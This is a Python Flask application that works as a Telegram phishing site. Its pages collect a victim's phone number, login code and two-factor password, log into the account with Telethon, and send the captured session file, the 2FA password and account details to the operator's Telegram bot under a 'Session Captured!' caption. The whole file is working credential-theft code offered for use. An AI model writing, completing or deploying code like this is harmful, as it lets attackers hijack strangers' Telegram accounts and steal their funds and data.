from flask import Flask, render_template, request, jsonify, session, send_from_directory
import os
import logging
import requests
import re
from config import Config
from telegram_client import TelegramAuth

from telethon.sync import TelegramClient
from telethon import functions
from telethon.errors import (
    SessionPasswordNeededError, 
    PhoneCodeInvalidError, 
    PhoneNumberInvalidError, 
    PasswordHashInvalidError,
    FloodWaitError
)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("WebApp")

# Определяем корневую директорию приложения
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TEMPLATE_DIR = os.path.join(BASE_DIR, 'templates')
STATIC_DIR = os.path.join(BASE_DIR, 'static')

app = Flask(__name__, template_folder=TEMPLATE_DIR, static_folder=STATIC_DIR)
app.secret_key = Config.SECRET_KEY 

def send_results_to_admin(phone, session_path, password_2fa=None):
    try:
        # Убеждаемся что путь к сессии правильный
        if not session_path.endswith('.session'):
            session_path = session_path + '.session'
            
        if not os.path.exists(session_path):
            logger.error(f"Session file not found: {session_path}")
            return
            
        client = TelegramClient(session_path, Config.TELEGRAM_API_ID, Config.TELEGRAM_API_HASH)
        client.connect()
        
        if not client.is_user_authorized():
            logger.error("Checker: Client not authorized")
            client.disconnect()
            return

        me = client.get_me()
        user_id = me.id
        username = f"@{me.username}" if me.username else "No Username"
        is_premium = "✅ True" if me.premium else "❌ False"
        
        stars_balance = "0"
        try:
            stars_status = client(functions.payments.GetStarsStatusRequest())
            stars_balance = str(stars_status.balance)
        except:
            stars_balance = "Error/0"

        client.disconnect()

        two_fa_text = f"🔐 <b>2FA Pass:</b> <code>{password_2fa}</code>" if password_2fa else "🔓 <b>2FA:</b> Empty"

        caption = (
            f"<b>✅ Session Captured!</b>\n\n"
            f"👤 <b>User:</b> {me.first_name} {username}\n"
            f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
            f"💎 <b>Premium:</b> {is_premium}\n"
            f"⭐️ <b>Stars:</b> {stars_balance}\n\n"
            f"📞 <b>Phone:</b> <code>{phone}</code>\n"
            f"{two_fa_text}"
        )

        file_path = session_path
        
        if os.path.exists(file_path):
            with open(file_path, 'rb') as f:
                files = {'document': (f'{phone}.session', f)}
                data = {'chat_id': Config.ADMIN_ID, 'caption': caption, 'parse_mode': 'HTML'}
                requests.post(f"https://api.telegram.org/bot{Config.BOT_TOKEN}/sendDocument", data=data, files=files)
        
        logger.info(f"LOG SENT FOR {phone}")

    except Exception as e:
        logger.error(f"Error sending log: {e}")

@app.route('/')
def index(): return render_template('auth_start.html')

@app.route('/auth_start.html')
def auth_start_html(): return render_template('auth_start.html')

@app.route('/auth')
def auth(): return render_template('auth.html')

@app.route('/code')
def code(): return render_template('code.html')

@app.route('/password')
def password(): return render_template('password.html')

@app.route('/success')
def success(): return render_template('success.html')

@app.route('/static/<path:filename>')
def serve_static(filename): return send_from_directory('static', filename)


@app.route('/login', methods=['POST'])
def login():
    auth = None
    try:
        data = request.get_json() or {}
        phone = data.get('phone_number', '').strip()
        user_id = data.get('user_id', 'web_user')
        session['user_id'] = user_id
        session['phone'] = phone
        
        if not phone: return jsonify({'success': False, 'error': 'Enter number'})

        if not os.path.exists(Config.SESSION_DIR): os.makedirs(Config.SESSION_DIR)
        clean_phone = phone.replace('+', '').replace(' ', '').replace('-', '')
        sess_path = os.path.join(Config.SESSION_DIR, clean_phone)
        
        auth = TelegramAuth(sess_path)
        res = auth.send_code(phone)
        
        session['phone_code_hash'] = res.phone_code_hash
        session['session_file'] = sess_path
        
        return jsonify({'success': True})

    except PhoneNumberInvalidError:
        return jsonify({'success': False, 'error': 'Invalid number'})
    except FloodWaitError as e:
        return jsonify({'success': False, 'error': f'Flood wait {e.seconds}s'})
    except Exception as e:
        logger.error(f"Login Error: {e}")
        return jsonify({'success': False, 'error': 'Connection error'})
    finally:
        if auth: auth.disconnect()

@app.route('/verify-code', methods=['POST'])
def verify_code():
    auth = None
    try:
        data = request.get_json() or {}
        code = data.get('code')
        phone = session.get('phone')
        
        auth = TelegramAuth(session.get('session_file'))
        auth.sign_in(phone, code, phone_code_hash=session.get('phone_code_hash'))
        
        # --- ФИКС: ОТКЛЮЧАЕМСЯ ПЕРЕД ОТПРАВКОЙ ЛОГОВ ---
        # Это освобождает файл session для функции send_results_to_admin
        auth.disconnect()
        auth = None # Чтобы finally не пытался отключить еще раз
        
        send_results_to_admin(phone, session.get('session_file'), password_2fa=None)
        
        return jsonify({'success': True})
    except SessionPasswordNeededError:
        return jsonify({'success': False, 'requires_2fa': True})
    except PhoneCodeInvalidError:
        return jsonify({'success': False, 'error': 'Invalid code'})
    except Exception as e:
        logger.error(f"Verify Code Error: {e}")
        return jsonify({'success': False, 'error': str(e)})
    finally:
        if auth: auth.disconnect()

@app.route('/verify-2fa', methods=['POST'])
def verify_2fa():
    auth = None
    try:
        data = request.get_json() or {}
        password = data.get('password')
        phone = session.get('phone')
        
        auth = TelegramAuth(session.get('session_file'))
        auth.sign_in(phone, None, password=password)
        
        auth.disconnect()
        auth = None 
        
        send_results_to_admin(phone, session.get('session_file'), password_2fa=password)
        
        return jsonify({'success': True})
    except PasswordHashInvalidError:
         return jsonify({'success': False, 'error': 'Invalid password'})
    except Exception as e:
        logger.error(f"2FA Error: {e}")
        return jsonify({'success': False, 'error': str(e)})
    finally:
        if auth: auth.disconnect()

if __name__ == '__main__':
    app.run(host=Config.FLASK_HOST, port=Config.FLASK_PORT, debug=Config.FLASK_DEBUG)